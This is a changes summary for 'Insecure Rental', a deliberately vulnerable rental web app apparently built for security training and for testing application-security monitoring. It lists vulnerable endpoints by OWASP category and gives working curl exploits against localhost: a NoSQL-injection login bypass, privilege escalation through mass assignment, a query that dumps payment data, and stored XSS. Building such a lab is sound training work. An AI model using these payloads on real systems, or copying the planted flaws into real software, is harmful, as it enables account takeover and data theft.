# Insecure Rental - Transformation Summary

## 🎯 Mission Accomplished

The application has been transformed from "Video Rental Store" into "Insecure Rental" - an intentionally vulnerable security testing platform with **all vulnerabilities integrated into the main API** (not separate endpoints).

---

## ✅ Changes Completed

### 1. Application Rebranding ✅
- **Name**: Video Rental Store → Insecure Rental
- **Purpose**: Educational security testing platform
- **Updated**: All HTML files, package.json, README.md
- **Warning banners**: Added to server startup and frontend

### 2. Removed "Buy Movies" Functionality ✅
- **Deleted**: `buy.html`, `buy-checkout.html`
- **Updated**: Rental model (removed 'buy' type)
- **Updated**: Movie model (removed buy pricing)
- **Updated**: Navigation across all pages

### 3. Added Multi-Type Rentals ✅
**Backend** (backend/models/Movie.js):
- Added `itemType` field: 'movies' | 'airplanes' | 'cars'
- Conditional fields based on type:
  - Movies: releaseYear, director, duration, rating
  - Airplanes/Cars: manufacturer, model, year

**Frontend** (frontend/rent.html):
- Type selector buttons: 🎬 Movies, ✈️ Airplanes, 🚗 Cars
- Dynamic category filters
- Flexible item display

**API** (backend/routes/movies.js):
- Type filtering: `/api/movies?type=airplanes`
- Support for all item types in queries

---

## 🔥 Main API Vulnerabilities (NOT Separate Endpoints!)

### Authentication API (/api/auth/*)

| Endpoint | Vulnerabilities | Risk |
|----------|----------------|------|
| `POST /api/auth/login` | NoSQL injection, auth bypass | CRITICAL |
| `POST /api/auth/register` | No password validation, info disclosure | HIGH |
| `GET /api/auth/search` | NoSQL injection, no auth required | HIGH |
| `POST /api/auth/reset-password` | No verification token | CRITICAL |
| `PUT /api/auth/profile` | Mass assignment → privilege escalation | CRITICAL |
| `GET /api/auth/user/:userId` | IDOR, exposes password hashes | CRITICAL |

### Movies API (/api/movies/*)

| Endpoint | Vulnerabilities | Risk |
|----------|----------------|------|
| `GET /api/movies` | NoSQL injection (multiple params) | HIGH |
| `GET /api/movies/:id?format=html` | Reflected XSS | HIGH |
| `PUT /api/movies/:id` | No auth, mass assignment | HIGH |
| `POST /api/movies/:id/review` | Stored XSS | HIGH |
| `GET /api/movies/:id/reviews?format=html` | XSS in response | HIGH |
| `GET /api/movies/search/advanced` | JavaScript injection via $where | CRITICAL |

### Rentals API (/api/rentals/*)

| Endpoint | Vulnerabilities | Risk |
|----------|----------------|------|
| `GET /api/rentals/:rentalId` | IDOR, sensitive data exposure | CRITICAL |
| `PUT /api/rentals/:rentalId` | IDOR, mass assignment | CRITICAL |
| `DELETE /api/rentals/:rentalId` | No authorization | HIGH |
| `GET /api/rentals/user` | NoSQL injection, IDOR | CRITICAL |
| `GET /api/rentals/search/query` | NoSQL injection | HIGH |

---

## 📊 OWASP Top 10 (2021) Coverage

✅ **A01:2021 – Broken Access Control**
- IDOR in auth, movies, rentals
- Public delete endpoints
- No authorization checks

✅ **A02:2021 – Cryptographic Failures**
- Payment data in plain text
- Password hashes exposed
- No encryption at rest

✅ **A03:2021 – Injection**
- NoSQL injection (10+ endpoints)
- XSS (reflected and stored)
- JavaScript injection via $where

✅ **A04:2021 – Insecure Design**
- Mass assignment vulnerabilities
- No input validation
- Business logic flaws

✅ **A05:2021 – Security Misconfiguration**
- CORS open to all origins
- Verbose error messages
- Stack traces exposed
- No rate limiting

✅ **A07:2021 – Identification and Authentication Failures**
- Authentication bypass
- No password complexity
- Weak password reset
- No account lockout

✅ **A08:2021 – Software and Data Integrity Failures**
- Insecure deserialization (eval)
- No integrity checks

✅ **A10:2021 – Server-Side Request Forgery**
- SSRF via URL fetch
- No URL validation

---

## 📁 New Documentation Files

1. **API_VULNERABILITIES.md**
   - Complete vulnerability catalog
   - Exploit examples for each endpoint
   - Multi-step attack scenarios
   - OWASP mappings

2. **VULNERABILITIES.md**
   - Detailed vulnerability explanations
   - Impact assessments
   - Remediation guidance
   - Still relevant for /api/vulnerable/* endpoints

3. **CHANGES_SUMMARY.md** (this file)
   - Summary of all changes made

---

## 🚀 Quick Start

```bash
# Start the application
cd backend
npm install
npm start

# In another terminal, start frontend
cd frontend
docker build -t insecure-rental-frontend .
docker run -p 8080:80 insecure-rental-frontend

# Access
Frontend: http://localhost:8080
Backend: http://localhost:5000
```

---

## 🎯 Example Exploits

### 1. Login Bypass (NoSQL Injection)
```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@example.com", "password": {"$ne": null}}'
```

### 2. Privilege Escalation
```bash
# Register
curl -X POST http://localhost:5000/api/auth/register \
  -d '{"username": "hacker", "email": "hack@test.com", "password": "x"}'

# Escalate to admin
curl -X PUT http://localhost:5000/api/auth/profile \
  -H "Authorization: Bearer [token]" \
  -d '{"role": "admin"}'
```

### 3. Steal All Payment Data
```bash
curl 'http://localhost:5000/api/rentals/user?userId[$ne]=null'
```

### 4. XSS in Movie Title
```bash
# Create movie with XSS
curl -X POST http://localhost:5000/api/movies \
  -d '{"itemType":"movies","title":"<script>alert(1)</script>","description":"Evil","genre":"Action","releaseYear":2024,"director":"Hacker","duration":90,"rating":5,"pricing":{"rent":3.99}}'

# View as HTML
curl "http://localhost:5000/api/movies/[id]?format=html"
```

---

## 📈 Statistics

- **Modified Files**: 17 files
- **Lines Changed**: ~1,300 insertions, ~600 deletions
- **Vulnerable Endpoints**: 17+ in main API
- **OWASP Categories**: 8 out of 10
- **New Features**: Airplane & car rentals
- **Removed Features**: Buy movies functionality

---

## 🔍 Testing with Datadog ASM

1. Enable ASM:
   ```bash
   export DD_APPSEC_ENABLED=true
   export DD_API_KEY=your-key
   ```

2. Run exploits from API_VULNERABILITIES.md

3. View in Datadog:
   - Security > Application Security
   - View detected attacks
   - Analyze threat patterns

---

## ⚠️ Important Notes

### What Makes This Different
Unlike typical vulnerable apps with `/vulnerable` or `/admin` test endpoints, **Insecure Rental has vulnerabilities in the actual application logic**:

✅ Realistic for security testing
✅ Better for ASM/WAF testing
✅ More educational value
✅ Mirrors real-world mistakes

### Legacy Endpoints
The `/api/vulnerable/*` endpoints still exist as additional examples, but are **not** the primary focus. The real vulnerabilities are in:
- `/api/auth/*`
- `/api/movies/*`
- `/api/rentals/*`

---

## 🎓 Learning Resources

1. **API_VULNERABILITIES.md** - Start here for exploit examples
2. **VULNERABILITIES.md** - Deep dive into each vulnerability
3. **README.md** - Setup and usage
4. Console logs - All [INSECURE] operations are logged

---

## 🛡️ Disclaimer

This application is **INTENTIONALLY VULNERABLE** for:
- ✅ Security education
- ✅ Testing security tools (Datadog ASM, WAF, SIEM)
- ✅ Security training and CTFs
- ✅ Demonstrating OWASP Top 10

**NEVER**:
- ❌ Deploy to production
- ❌ Expose to public internet
- ❌ Use with real data
- ❌ Use for actual rentals

---

## 📞 Support

- Issues: https://github.com/anthropics/claude-code/issues
- Documentation: See markdown files in repo
- Datadog ASM: https://docs.datadoghq.com/security/application_security/

---

**Built with intentional vulnerabilities for security education** 🔓
